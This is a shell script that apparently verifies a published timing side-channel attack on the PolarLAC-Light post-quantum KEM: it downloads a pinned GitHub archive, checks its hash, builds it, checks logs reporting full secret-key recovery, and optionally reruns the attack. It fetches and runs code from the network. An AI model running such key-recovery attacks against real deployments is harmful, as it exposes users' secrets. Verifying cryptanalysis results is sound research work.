#!/bin/sh
set -eu

commit=424c88cf44fa4330fa56ad19d275306d5c85692f
archive_sha256=46ee691d8125c28271d1042f9f6408cd5849eefad45d3a3e768cab27c6418d57
url="https://codeload.github.com/Yutianrun/polarlac-timing-attack/tar.gz/$commit"
tmp=$(mktemp -d "${TMPDIR:-/tmp}/ngcc-polarlac-timing.XXXXXX")
trap 'rm -rf -- "$tmp"' EXIT HUP INT TERM

if ! curl -L --fail --silent --show-error "$url" -o "$tmp/package.tar.gz"; then
    echo 'SKIP kem-30-1: pinned timing package is unavailable' >&2
    exit 77
fi
printf '%s  %s\n' "$archive_sha256" "$tmp/package.tar.gz" | sha256sum -c -
tar -xzf "$tmp/package.tar.gz" -C "$tmp"
root="$tmp/polarlac-timing-attack-$commit"

(cd "$root" && sh ./build.sh >/dev/null)
log1="$root/timing_fullkey_light_20261003_113442.log"
log2="$root/timing_fullkey_light_20261003_144335.log"
grep -Fq 'RESULT: units unique+correct 256/256  sk coeff mismatch 0/512' "$log1"
grep -Fq 'oracle decaps (diff pairs *2): 17010803 differential measurements' "$log1"
grep -Fq 'fresh ct, recovered sk : OK (plaintext recovered)' "$log1"
grep -Fq 'RESULT: units unique+correct 256/256  sk coeff mismatch 0/512' "$log2"
grep -Fq 'oracle decaps (diff pairs *2): 17000872 differential measurements' "$log2"
grep -Fq 'fresh ct, recovered sk : OK (plaintext recovered)' "$log2"

if [ "${NGCC_SLOW:-0}" = 1 ]; then
    (cd "$root" && sh ./run_timing.sh)
fi

echo 'ATTACK kem-30-1 CONFIRMED: PolarLAC-Light timing evidence recovers 512/512 secret coefficients'
